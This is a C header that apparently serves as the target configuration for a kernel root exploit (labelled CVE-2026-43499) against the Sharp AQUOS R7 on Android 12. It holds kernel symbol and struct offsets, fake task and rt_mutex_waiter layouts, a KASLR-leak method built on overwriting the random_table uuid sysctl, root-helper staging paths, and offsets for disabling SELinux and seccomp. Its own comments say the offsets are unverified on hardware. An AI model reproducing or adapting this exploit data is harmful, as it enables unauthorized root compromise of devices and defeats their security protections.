/*
 * a202sh / JP / 5.10.81-android12-9-ge4225e527617-ab8339909
 * Sharp AQUOS R7 (A202SH / SGA202SH), SoftBank JP build SC263/01.00.13,
 * Qualcomm Snapdragon 8 Gen 1 (SM8450), VA_BITS=39, 4K pages.
 *
 * Kernel built: Wed Mar 9 01:00:51 UTC 2022 (GKI android12-5.10, build ab8339909).
 * Android 12, SDK 31, SPL 2022-12-01.
 *
 * All symbol offsets extracted from GKI vmlinux
 * (ci.android.com build 8871204, android12-5.10-2022-03_r9) via nm.
 * Struct offsets from Linux 5.10 GKI android12 (identical to quest3/
 * 5.10.240-g55be3759aea4, cross-checked against q4q-F9360ZCSAIZF1 target.h).
 *
 * Status: offsets extracted from GKI vmlinux and not yet verified on hardware.
 * This device has no fastboot and no public firmware images; the GKI image
 * was the only available source. Symbol addresses may differ if Sharp applied
 * out-of-tree patches that shift .text/.data layout.
 *
 * P0_KERNEL_PHYS_LOAD: inherited from SM8450 (same SoC as q4q/SM-F9360).
 * If the KASLR leak fails ("slide kaslr leak failed"), try 0x80080000.
 */
#ifndef TARGET_A202SH_5_10_81_ANDROID12_9_GE4225E527617_CORE510_H
#define TARGET_A202SH_5_10_81_ANDROID12_9_GE4225E527617_CORE510_H

/* --- begin generated ---------------------------------------------------- */

#define BUILD_VARIANT_LABEL "a202sh_SC263_01.00.13"
#define BUILD_FINGERPRINT   "SG/SGA202SH/Mineva:12/SC263/01.00.13:user/release-keys"

#define KIMAGE_TEXT_BASE_DEFAULT    0xffffffc008000000ULL
#define P0_PAGE_OFFSET              0xffffff8000000000ULL
#define P0_PHYS_OFFSET              0x80000000ULL
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD         0xa8000000ULL   /* SM8450, same as q4q */
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL
#define DIRECT_MAP_BASE             0xffffff8000000000ULL
#define DIRECT_MAP_END              0xFFFFFFC000000000ULL
#define VMEMMAP_START               0xFFFFFFFEFFE00000ULL

/* ---- ashmem ---- */
#define ASHMEM_MISC_FOPS_OFF        0x0ab16440ULL   /* &ashmem_misc.fops (+0x10) */
#define ASHMEM_FOPS_OFF             0x0a48cb38ULL   /* &ashmem_fops              */
#define ASHMEM_IOCTL_OFF            0x0923d8d4ULL   /* ashmem_ioctl              */
#define ASHMEM_COMPAT_IOCTL_OFF     0x0923e8e8ULL   /* compat_ashmem_ioctl       */
#define ASHMEM_MMAP_OFF             0x0923e948ULL   /* ashmem_mmap               */
#define ASHMEM_OPEN_OFF             0x0923ec64ULL   /* ashmem_open               */
#define ASHMEM_RELEASE_OFF          0x0923ed04ULL   /* ashmem_release            */
#define ASHMEM_SHOW_FDINFO_OFF      0x0923eef4ULL   /* ashmem_show_fdinfo        */
#define ASHMEM_READ_ITER_OFF        0x0923d428ULL   /* ashmem_llseek (llseek slot) */

/* ---- configfs (v5.10: .read/.write, not .read_iter/.write_iter) ---- */
#define CONFIGFS_READ_FILE_OFF      0x086d145cULL   /* configfs_read_file        */
#define CONFIGFS_WRITE_BIN_FILE_OFF 0x086d20ecULL   /* configfs_write_bin_file   */

#define COPY_SPLICE_READ_OFF        0x085d8394ULL   /* generic_file_splice_read  */
#define NOOP_LLSEEK_OFF             0x0855b538ULL   /* noop_llseek               */

/* ---- kernel data objects ---- */
#define INIT_TASK_OFF               0x0a9cbec0ULL   /* init_task                 */
#define INIT_UTS_NS_OFF             0x0a9cbc68ULL   /* init_uts_ns               */
#define EMPTY_ZERO_PAGE_OFF         0x0abbf000ULL   /* empty_zero_page           */
#define ROOT_TASK_GROUP_OFF         0x0abc4040ULL   /* root_task_group           */
#define SELINUX_ENFORCING_OFF       0x0ac73b58ULL   /* selinux_state (.enforcing@+0x00) */
#define SELINUX_BLOB_SIZES_OFF      0x0a4cf130ULL   /* selinux_blob_sizes        */
#define SECURITY_HOOK_HEADS_OFF     0x0a4ceaa0ULL   /* security_hook_heads       */
#define KMALLOC_CACHES_OFF          0x0a4ce5d8ULL   /* kmalloc_caches            */
#define ANON_PIPE_BUF_OPS_OFF       0x0a33db28ULL   /* anon_pipe_buf_ops         */
#define INIT_CRED_OFF               0x0a9e07f0ULL   /* init_cred                 */

/* ---- KASLR slide — uuid sysctl path (same as quest3) ---- */
/*
 * random_table[5] is the uuid entry (.data = NULL).
 * We write &nfulnl_logger into random_table[5].data, then read
 * /proc/sys/kernel/random/uuid: proc_do_uuid prints the 16 bytes at .data,
 * qword 0 is nfulnl_logger.name (slid pointer to "nfnetlink_log"),
 * slide = leaked_va - SLIDE_NFULNL_LOGGER_NAME_OFF.
 * loggers[0][1] is not used on this build (nfulnl_logger is the anchor).
 */
#define SLIDE_INIT_TASK_OFF                 INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF           ROOT_TASK_GROUP_OFF
#define SLIDE_RANDOM_UUID_DATA_OFF          0x0aad6f90ULL  /* &random_table[5].data */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF       0x0aad6f50ULL  /* &random_table[4].data */
#define SLIDE_SYSCTL_BOOTID_OFF             0x0ac8d57cULL  /* sysctl_bootid         */
#define SLIDE_LOGGERS_0_1_OFF               0x0a9c12c8ULL  /* loggers[0][1]         */
#define SLIDE_NFULNL_LOGGER_OFF             0x0a9c1398ULL  /* nfulnl_logger         */
#define SLIDE_NFULNL_LOGGER_NAME_OFF        0x0225c991ULL  /* nfulnl_logger.name value (ptr to string) */

/* ---- root usermodehelper ---- */
#define ROOT_HELPER_PATH            "/data/local/tmp/cve-2026-43499-root"
#define EXP32_STAGED_PATH           "/data/local/tmp/cve-2026-43499-exp32"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x08163cb8ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x0a9b9e00ULL

/* ---- fake page layout (within 32KB order-3 kernel page) ---- */
#define LOCK_OFF                    0x1000
#define FOPS_OFF                    0x2000
#define W0_OFF                      0x2400
#define FAKE_TASK_OFF               0x3000

/* ---- rt_mutex_waiter offsets (v5.10) ---- */
#define WAITER_TREE_ENTRY_OFF       0x00
#define WAITER_PI_TREE_ENTRY_OFF    0x18
#define WAITER_TASK_OFF             0x30
#define WAITER_LOCK_OFF             0x38
#define WAITER_PRIO_OFF             0x40
#define WAITER_DEADLINE_OFF         0x48

#define FAKE_WAITER_PI_TREE_ENTRY_OFF   WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_TASK_OFF            WAITER_TASK_OFF
#define FAKE_WAITER_LOCK_OFF            WAITER_LOCK_OFF
#define FAKE_WAITER_DEADLINE_OFF        WAITER_DEADLINE_OFF

/* ---- task_struct offsets (v5.10 GKI android12, SM8450) ---- */
#define FAKE_TASK_USAGE_OFF         0x38    /* atomic_t usage               */
#define FAKE_TASK_PRIO_OFF          0x94    /* int prio                     */
#define FAKE_TASK_NORMAL_PRIO_OFF   0x9c    /* int normal_prio              */
#define FAKE_TASK_TASK_GROUP_OFF    0x310   /* struct task_group *          */
#define FAKE_TASK_PI_LOCK_OFF       0x854   /* raw_spinlock_t pi_lock       */
#define FAKE_TASK_PI_WAITERS_OFF    0x868   /* struct rb_root_cached        */
#define FAKE_TASK_PI_TOP_TASK_OFF   0x878   /* struct task_struct *         */
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x880   /* struct rt_mutex_waiter *     */

#define TASK_THREAD_INFO_FLAGS_OFF  0x00
#define TASK_TASKS_OFF              0x4c0
#define TASK_ATOMIC_FLAGS_OFF       0x588
#define TASK_PID_OFF                0x5c0
#define TASK_TGID_OFF               0x5c4
#define TASK_REAL_PARENT_OFF        0x5d0
#define TASK_SECCOMP_OFF            0x830
#define TASK_REAL_CRED_OFF          0x770
#define TASK_CRED_OFF               0x778
#define TASK_COMM_OFF               0x788

/* ---- cred offsets (v5.10) ---- */
#define CRED_UID_OFF                0x04
#define CRED_SECUREBITS_OFF         0x24
#define CRED_CAPS_OFF               0x28
#define CRED_SECURITY_OFF           0x78
#define CRED_USER_OFF               0x80

/* ---- SELinux cred blob (v5.10) ---- */
#define SELINUX_CRED_BLOB_OFF       0
#define SELINUX_CRED_OSID_OFF       0
#define SELINUX_CRED_SID_OFF        4

/* ---- seccomp (v5.10) ---- */
#define SECCOMP_MODE_OFF            0x00
#define SECCOMP_FILTER_COUNT_OFF    0x04
#define SECCOMP_FILTER_OFF          0x08
#define TIF_SECCOMP_BIT             11
#define PFA_NO_NEW_PRIVS_BIT        0

/* ---- configfs buffer overlay (v5.10) ---- */
#define CFG_PAGE_OFF                16
#define CFG_NEEDS_READ_FILL_OFF     80
#define CFG_BIN_BUFFER_OFF          88
#define CFG_BIN_BUFFER_SIZE_OFF     96
#define CFG_CB_MAX_SIZE_OFF         100

/* ---- struct page (v5.10) ---- */
#define STRUCT_PAGE_SIZE            0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF       0x18
#define STRUCT_PAGE_TYPE_OFF        0x30

/* ---- pipe buffer (v5.10) ---- */
#define PIPE_BUFFER_SIZE            0x28
#define PIPE_BUFFER_SLOTS           32
#define PIPE_BUF_FLAG_CAN_MERGE     0x10

/* ---- file_operations offsets (v5.10) ---- */
#define FOPS_OWNER_OFF              0x00
#define FOPS_LLSEEK_OFF             0x08
#define FOPS_READ_OFF               0x10
#define FOPS_WRITE_OFF              0x18
#define FOPS_READ_ITER_OFF          0x20
#define FOPS_WRITE_ITER_OFF         0x28
#define FOPS_IOCTL_OFF              0x50
#define FOPS_COMPAT_IOCTL_OFF       0x58
#define FOPS_MMAP_OFF               0x60
#define FOPS_OPEN_OFF               0x70
#define FOPS_RELEASE_OFF            0x80
#define FOPS_SPLICE_READ_OFF        0xc8
#define FOPS_SHOW_FDINFO_OFF        0xe0

/* --- end generated ------------------------------------------------------ */

/*
 * One attempt: re-entering the chain in the same process after a miss
 * risks walking a stale fake page under raw_spin_lock_irq -> immediate reboot.
 * Retry across a reboot instead.
 */
#define PAYLOAD_ATTEMPT_BUDGET      1
#define PAYLOAD_ATTEMPT_TIMEOUT_SEC 600

#endif
